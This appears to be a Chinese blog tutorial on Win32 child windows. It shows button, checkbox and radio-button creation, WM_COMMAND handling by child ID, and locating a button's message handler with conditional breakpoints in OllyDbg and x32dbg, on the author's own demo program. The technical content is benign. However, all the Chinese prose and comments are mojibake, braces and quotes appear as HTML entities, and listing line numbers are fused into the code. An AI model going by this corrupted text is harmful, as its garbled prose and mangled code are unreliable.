çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstance wndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•° // 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±» HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; CreateButton(hWnd); ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ // 3. æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // æ¶ˆæ¯å¾ªç¯ &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // ç¿»è¯‘æ¶ˆæ¯ DispatchMessage(&amp;msg); // åˆ†å‘æ¶ˆæ¯ &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125;void CreateButton(HWND hwnd)&#123; HWND hwndPushButton = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;æ™®é€šæŒ‰é’®&quot;), //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 10, 10, 80, 20, hwnd, (HMENU)1001, //å­çª—å£ID g_hInstance, NULL); HWND hwndCheckBox = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;å¤é€‰æ¡†&quot;), //WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, 10, 40, 80, 20, hwnd, (HMENU)1002, //å­çª—å£ID g_hInstance, NULL); HWND hwndRadio = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;å•é€‰æŒ‰é’®&quot;), //WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON | BS_AUTORADIOBUTTON, WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON, 10, 70, 80, 20, hwnd, (HMENU)1003, //å­çª—å£ID g_hInstance, NULL);&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable : 4996)LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);+ void CreateButton(HWND hwnd);+ HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow) // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—&#123; g_hInstance = hInstance; // 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ WNDCLASS wndClass = &#123; 0 &#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰² TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // çª—å£ç±»å wndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstance wndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•° // 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±» HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125;+ CreateButton(hWnd); ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ // 3. æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // æ¶ˆæ¯å¾ªç¯ &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // ç¿»è¯‘æ¶ˆæ¯ DispatchMessage(&amp;msg); // åˆ†å‘æ¶ˆæ¯ &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125;+void CreateButton(HWND hwnd)+&#123;+ HWND hwndPushButton = CreateWindow(+ TEXT(&quot;button&quot;),+ TEXT(&quot;æ™®é€šæŒ‰é’®&quot;),+ //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, + WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON,+ 10, 10,+ 80, 20,+ hwnd,+ (HMENU)1001, //å­çª—å£ID + g_hInstance,+ NULL);++ HWND hwndCheckBox = CreateWindow(+ TEXT(&quot;button&quot;),+ TEXT(&quot;å¤é€‰æ¡†&quot;),+ //WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, + WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX,+ 10, 40,+ 80, 20,+ hwnd,+ (HMENU)1002, //å­çª—å£ID + g_hInstance,+ NULL);++ HWND hwndRadio = CreateWindow(+ TEXT(&quot;button&quot;),+ TEXT(&quot;å•é€‰æŒ‰é’®&quot;),+ //WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON | BS_AUTORADIOBUTTON, + WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON,+ 10, 70,+ 80, 20,+ hwnd,+ (HMENU)1003, //å­çª—å£ID + g_hInstance,+ NULL);+&#125; 1234567891011HWND hwndPushButton = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;æ™®é€šæŒ‰é’®&quot;), //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 10, 10, 80, 20, hwnd, (HMENU)1001, //å­çª—å£ID g_hInstance, NULL); windowsäº‹å…ˆå®šä¹‰å¥½çš„çª—å£ç±» é€šè¿‡ç¬¬ä¸€ä¸ªçª—å£ç¨‹åºé‚£ä¸€å°èŠ‚çš„ä»£ç æˆ‘ä»¬çŸ¥é“ï¼ŒCreateWindowsç¬¬ä¸€ä¸ªå‚æ•°ä¼ çš„æ˜¯è‡ªå·±å†™çš„çª—å£ç±»åï¼Œè€Œè¿™é‡Œç”¨æ˜¯windowsäº‹å…ˆå®šä¹‰å¥½çš„çª—å£ç±»ï¼Œè¿™ä¸ªTEXT(&quot;button&quot;)è¡¨ç¤ºç”¨windowsäº‹å…ˆåˆ›å»ºå¥½çš„æŒ‰é’®ç±»çª—å£ hMenuå‚æ•° åœ¨CreateWindowçˆ¶çª—å£é‚£ï¼Œè¡¨ç¤ºçš„æ˜¯èœå•å¥æŸ„çš„å«ä¹‰ï¼Œçˆ¶çª—å£é‚£ä¸éœ€è¦èœå•å°±å¡«NULLã€‚è€Œåœ¨å­çª—å£è¿™è¡¨ç¤ºè¿™ä¸ªå­çª—å£çš„IDï¼Œç›¸å½“äºå­çª—å£çš„ç¼–å· å¯ä»¥ä½“ä¼šåˆ°ï¼šåœ¨windowsä¸­æ‰€æœ‰çš„ç»„ä»¶ç»ˆå½’éƒ½æ˜¯çª—å£ å­çª—å£æ¶ˆæ¯çš„å¤„ç† è‡ªå·±å®šä¹‰çª—å£ç±»çš„è¯ï¼Œåœ¨CreateWindowå‰ï¼Œéœ€è¦åˆ›å»ºWNDCLASSç±»çš„å¯¹è±¡ï¼Œå¡«å……å­—æ®µï¼Œè€Œä¸Šé¢æˆ‘ä»¬åœ¨CreateWindowç›´æ¥ç”¨ç³»ç»Ÿäº‹å…ˆé¢„å®šä¹‰å¥½çš„æŒ‰é’®ç±»çª—å£ï¼Œè¿™äº›å­—æ®µä¸ç”¨è‡ªå·±å¡«å……äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰ç»™å­çª—å£è¯´å›è°ƒå‡½æ•°æ˜¯å“ªä¸ªã€‚è¿™æ ·çš„è¯ï¼Œå­çª—å£çš„æ¶ˆæ¯æ€ä¹ˆå¤„ç†ï¼Ÿå¦‚æœæˆ‘ä»¬æƒ³çœ‹windowsé¢„å…ˆå®šä¹‰å¥½çš„WNDCLASSç»“æ„ä½“é‡Œå­—æ®µçš„å€¼ï¼Œæˆ‘ä»¬æ€ä¹ˆçœ‹ï¼Ÿ 12345678910111213141516171819202122232425// 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„WNDCLASS wndClass = &#123; 0 &#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰²TCHAR className[] = TEXT(&quot;My First Window&quot;);wndClass.lpszClassName = className; // çª—å£ç±»åwndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstancewndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•°// 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±»HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º//...//æ£€æŸ¥CreateWindowæ˜¯å¦æ‰§è¡ŒæˆåŠŸçš„ä»£ç ç•¥//...ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ ç”¨GetClassNameè·å–ä¸€ä¸ªçª—å£çš„ç±»åï¼Œé€šè¿‡ç±»åè°ƒç”¨GetClassInfoå‡½æ•°å¾—åˆ°WNDCLASSç»“æ„ä½“ï¼Œç„¶åå°±å¯ä»¥æŸ¥çœ‹WNDCLASSç»“æ„ä½“é‡Œçš„å­—æ®µäº† å°†è¿™æ®µä»£ç æ”¾åˆ°CreateButtonå‡½æ•°ä¸­åˆ›å»ºhwndPushButtonçª—å£åé¢1234567TCHAR szBuffer[0x20];GetClassName(hwndPushButton, szBuffer, 0x20);WNDCLASS wc;GetClassInfo(g_hInstance, szBuffer, &amp;wc);OutputDebugStringF(&quot;--&gt;%s &quot;, wc.lpszClassName);OutputDebugStringF(&quot;--&gt;%x &quot;, wc.lpfnWndProc); CreateButtonå®Œæ•´ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546void CreateButton(HWND hwnd)&#123; HWND hwndPushButton = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;æ™®é€šæŒ‰é’®&quot;), //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 10, 10, 80, 20, hwnd, (HMENU)1001, //å­çª—å£ID g_hInstance, NULL); TCHAR szBuffer[0x20]; GetClassName(hwndPushButton, szBuffer, 0x20); WNDCLASS wc; GetClassInfo(g_hInstance, szBuffer, &amp;wc); OutputDebugStringF(&quot;--&gt;%s &quot;, wc.lpszClassName); OutputDebugStringF(&quot;--&gt;%x &quot;, wc.lpfnWndProc); HWND hwndCheckBox = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;å¤é€‰æ¡†&quot;), //WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, 10, 40, 80, 20, hwnd, (HMENU)1002, //å­çª—å£ID g_hInstance, NULL); HWND hwndRadio = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;å•é€‰æŒ‰é’®&quot;), //WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON | BS_AUTORADIOBUTTON, WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON, 10, 70, 80, 20, hwnd, (HMENU)1003, //å­çª—å£ID g_hInstance, NULL);&#125; å‘ç°ç±»åå°±æ˜¯Buttonï¼Œè€Œå›è°ƒå‡½æ•°åœ°å€ä¸º77b57f60ï¼Œè¿™ä¸ªå‡½æ•°åœ¨å†…æ ¸ä¸­ã€‚ å®é™…ä¸Šï¼Œå½“å¼€å‘è€…ä½¿ç”¨å­çª—å£ç±»æ¥åˆ›å»ºçª—å£ï¼Œwindowsè§‰å¾—å¼€å‘è€…æ²¡å¿…è¦ä¸ºå­çª—å£å†å†™ä¸ªå›è°ƒå‡½æ•°ï¼Œæ‰€ä»¥ç³»ç»Ÿæä¾›äº†å›è°ƒå‡½æ•°ã€‚ å¦‚æœæˆ‘ä»¬åœ¨çˆ¶çª—å£çš„å›è°ƒå‡½æ•°ä¸­ç”¨case WM_LBUTTONDOWN:æ¥å¤„ç†é¼ æ ‡å·¦é”®çš„æ¶ˆæ¯ï¼Œåœ¨å­çª—å£ä¸Šç‚¹å‡»é¼ æ ‡å·¦é”®æ˜¯ä¸ä¼šæ‰§è¡ŒDbgPrintfé‚£å¥çš„ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰è§¦å‘WM_LBUTTONDOWNæ¶ˆæ¯ï¼›åœ¨çˆ¶çª—å£å…¶ä»–åŒºåŸŸç‚¹é¼ æ ‡å·¦é”®ï¼Œä¼šè§¦å‘WM_LBUTTONDOWNæ¶ˆæ¯ï¼ŒDbgPrintfä¼šæ‰§è¡Œè¾“å‡ºã€‚ 123456789switch (uMsg)&#123; // é¼ æ ‡å·¦é”®æŒ‰ä¸‹æ—¶è§¦å‘çš„æ¶ˆæ¯ case WM_LBUTTONDOWN: &#123; DbgPrintf(&quot;WM_LBUTTONDOWN %d %d &quot;, wParam, lParam); return 0; &#125;&#125; åŸå› æ˜¯è¿™æ ·çš„ï¼Œå½“ç”¨æˆ·ç‚¹å‡»æŒ‰é’®åï¼Œè§¦å‘äº†ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¿™ä¸ªæ¶ˆæ¯ç”±ç³»ç»Ÿçš„å›è°ƒå‡½æ•°å¤„ç†ï¼Œå¤„ç†åè½¬æ¢ä¸ºWM_COMMANDæ¶ˆæ¯ä¼ ç»™çˆ¶çª—å£çš„å›è°ƒå‡½æ•°è¿›è¡Œå¤„ç†ã€‚ ç”¨æˆ·åœ¨å­çª—å£ä¸Šé¼ æ ‡å·¦é”®çš„æ¶ˆæ¯å·²ç»ä¸å†æ˜¯åŸæ¥çš„LBUTTONæ¶ˆæ¯ï¼Œè€Œè¢«è½¬æ¢æˆäº†WM_COMMANDæ¶ˆæ¯ã€‚æ‰€ä»¥å¦‚æœæƒ³å¤„ç†å­çª—å£ä¸Šé¼ æ ‡å·¦é”®çš„æ¶ˆæ¯ï¼Œè¦ç”¨WM_COMMANDï¼Œå¹¶ä¸”æ­¤æ—¶wParamçš„ä½å­—èŠ‚è¡¨ç¤ºçš„æ˜¯å­çª—å£IDã€‚ 12345678910111213141516case WM_COMMAND: &#123; switch(LOWORD(wParam)) &#123; case 1001: MessageBox(hwnd,&quot;Hello Button 1&quot;,&quot;Demo&quot;,MB_OK); return 0; case 1002: MessageBox(hwnd,&quot;Hello Button 2&quot;,&quot;Demo&quot;,MB_OK); return 0; case 1003: MessageBox(hwnd,&quot;Hello Button 3&quot;,&quot;Demo&quot;,MB_OK); return 0; &#125; return DefWindowProc(hwnd,uMsg,wParam,lParam); &#125; å­çª—å£æ¶ˆæ¯äº‹ä»¶å¤„ç†é€»è¾‘å®šä½ è¿™ä¸€å°èŠ‚ç”¨çš„exeçš„æºç vc++ä¸‹Releaseç¼–è¯‘å‡ºçš„exevc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt;#include &lt;Windows.h&gt;void __cdecl OutputDebugStringF(const char* format, ...);#ifdef _DEBUG #define DbgPrintf OutputDebugStringF #else #define DbgPrintf#endif LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);void CreateButton(HWND hwnd);HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow) // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—&#123; g_hInstance = hInstance; // 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ WNDCLASS wndClass = &#123; 0 &#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰² TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // çª—å£ç±»å wndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstance wndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•° // 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±» HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; CreateButton(hWnd); ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ // 3. æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // æ¶ˆæ¯å¾ªç¯ &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // ç¿»è¯‘æ¶ˆæ¯ DispatchMessage(&amp;msg); // åˆ†å‘æ¶ˆæ¯ &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; //å­çª—å£æ¶ˆæ¯ case WM_COMMAND: &#123; switch (LOWORD(wParam)) &#123; case 1001: MessageBox(hwnd, &quot;Hello Button 1&quot;, &quot;Demo&quot;, MB_OK); return 0; case 1002: MessageBox(hwnd, &quot;Hello Button 2&quot;, &quot;Demo&quot;, MB_OK); return 0; case 1003: MessageBox(hwnd, &quot;Hello Button 3&quot;, &quot;Demo&quot;, MB_OK); return 0; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125;void CreateButton(HWND hwnd)&#123; HWND hwndPushButton = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;æ™®é€šæŒ‰é’®&quot;), //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 10, 10, 80, 20, hwnd, (HMENU)1001, //å­çª—å£ID g_hInstance, NULL); TCHAR szBuffer[0x20]; GetClassName(hwndPushButton, szBuffer, 0x20); WNDCLASS wc; GetClassInfo(g_hInstance, szBuffer, &amp;wc); OutputDebugStringF(&quot;--&gt;%s &quot;, wc.lpszClassName); OutputDebugStringF(&quot;--&gt;%x &quot;, wc.lpfnWndProc); HWND hwndCheckBox = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;å¤é€‰æ¡†&quot;), //WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, 10, 40, 80, 20, hwnd, (HMENU)1002, //å­çª—å£ID g_hInstance, NULL); HWND hwndRadio = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;å•é€‰æŒ‰é’®&quot;), //WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON | BS_AUTORADIOBUTTON, WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON, 10, 70, 80, 20, hwnd, (HMENU)1003, //å­çª—å£ID g_hInstance, NULL);&#125;void __cdecl OutputDebugStringF(const char* format, ...)&#123; va_list vlArgs; char* strBuffer = (char*)GlobalAlloc(GPTR, 4096); if (!strBuffer) return; va_start(vlArgs, format); _vsnprintf(strBuffer, 4096 - 1, format, vlArgs); va_end(vlArgs); strcat(strBuffer, &quot; &quot;); OutputDebugStringA(strBuffer); GlobalFree(strBuffer);&#125; 12345LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ ); é€šè¿‡ä¸Šé¢çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªçª—å£ç¨‹åºçš„å›è°ƒå‡½æ•°åï¼Œåˆšè¿›å…¥å›è°ƒå‡½æ•°æ—¶å †æ ˆæ˜¯è¿™æ ·çš„ï¼š ESP è¿”å›åœ°å€ hwnd uMsg wParam lParam 12ESP + 8 == uMsgESP + C == wParam åœ¨å›è°ƒå‡½æ•°å¼€å¤´åŠ æ™®é€šæ–­ç‚¹åï¼Œæ·»åŠ æ¡ä»¶[esp+8]==WM_COMMANDï¼Œç”¨äºæ–­å­çª—å£ã€‚ä½†è¿™åªèƒ½æ–­æ‰€æœ‰å­çª—å£çš„æ¶ˆæ¯ï¼Œå¦‚æœæƒ³ç²¾ç¡®æ–­ä¸‹æŸä¸ªå­çª—å£çš„æ¶ˆæ¯ï¼Œè¿˜è¦å†åŠ æ¡ä»¶ã€‚æ–­[esp+8]==WM_COMMANDåè®©ç¨‹åºè·‘èµ·æ¥ï¼Œç‚¹å‡»â€œWâ€æŒ‰é’®ï¼Œåˆ·æ–°ï¼Œå°±å¯ä»¥æŸ¥çœ‹åˆ°æ‰€æœ‰çª—å£çš„IDã€‚ å‡»â€œWâ€æŒ‰é’®åçœ‹ä¸åˆ°çª—å£å¥æŸ„ç›¸å…³ä¿¡æ¯è§£å†³åŠæ³•ï¼šæ–­åœ¨WM_COMMANDåè®©ç¨‹åºè·‘èµ·æ¥ï¼Œç‚¹å‡»â€œWâ€æŒ‰é’®ï¼Œæ²¡æœ‰ï¼Œç‚¹åˆ·æ–°ï¼Œå°±å‡ºæ¥äº†æ–­åœ¨WM_COMMANDåè®©ç¨‹åºè·‘èµ·æ¥ï¼Œåœ¨å­çª—å£ç‚¹ä¸€ä¸‹ï¼Œå†ç‚¹Wå°±å‡ºæ¥äº†ä¸ºä»€ä¹ˆè¦åˆ·æ–°ï¼Ÿæ¢ç´¢è¿‡ç¨‹ï¼šODä¸å¼€æºï¼Œæ²¡æºç ã€‚æ‰¾çš„x32dbgï¼Œx32dbgåœ¨â€œå¥æŸ„â€-â€œçª—å£â€æ˜¾ç¤ºåŒºä¹Ÿæœ‰åŒæ ·çš„åŠŸèƒ½ï¼Œå³é”®ä¹Ÿèƒ½åˆ·æ–°ï¼Œä»githubä¸Šä¸‹æºç ï¼ˆé“¾æ¥æ˜¯æœ¬æ–‡å†™ä½œæ—¶çš„ä¸‹çš„ï¼Œåç»­ç‰ˆæœ¬æ›´æ–°æºç å¯èƒ½æœ‰å˜ï¼‰VSCodeå…¨å±€æœrefreshï¼Œæ‰¾å³é”®èœå•ç‚¹å‡»åˆ·æ–°åçš„ä»£ç HandlesView.cpp æ‰§è¡ŒEnumWindowså‡½æ•°ï¼Œç„¶åå°†å¾—åˆ°çš„å­—æ®µå¡«å……åœ¨çª—å£ç•Œé¢ä¸Š12345678910111213141516171819202122232425262728293031323334353637383940//Enumerate windows and update windows tablevoid HandlesView::enumWindows()&#123; BridgeList&lt;WINDOW_INFO&gt; windows; if(DbgFunctions()-&gt;EnumWindows(&amp;windows)) &#123; auto count = windows.Count(); 